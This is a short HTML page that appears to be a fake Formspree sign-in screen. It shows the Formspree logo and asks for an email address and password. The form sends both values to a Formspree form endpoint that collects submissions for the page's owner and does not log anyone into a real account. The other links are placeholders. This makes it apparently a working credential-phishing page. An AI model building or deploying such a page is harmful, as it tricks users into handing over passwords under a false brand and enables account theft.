<!DOCTYPE html>
<html lang="en">

    <title>Sign-in</title>

  <body>
      <main>
        <a href="#"><img class="logo" src="https://formspree.io/static/img/logo-mark.svg" alt="logo"></a>
        <p class="logop">Formspree</p>
        <form action="https://formspree.io/f/xjvljzoj" method="post" >
            <div class="header">
                <h1>Sign in</h1>
                Or <a href="www.google.com">register for an account</a>
              </div>
              <br><br>
            <div class="email">
                <label for="email">Email address</label>
                <br>
                <input name="email" type="email" required />
            </div>
            <br>
            <div class="password">
                <label for="password">Password</label>
                <br>
                <input name="password" type="password" required />
            </div>
            <br>
            <div class="button">
                <button type="submit"><strong>Sign in</strong></button>
            </div>
            <br><br>
            <div class="link">
                <a href="www.google.com">Forgot your password?</a>
            </div>
          </form>
          <footer>

        </footer>

  </body>
</html>
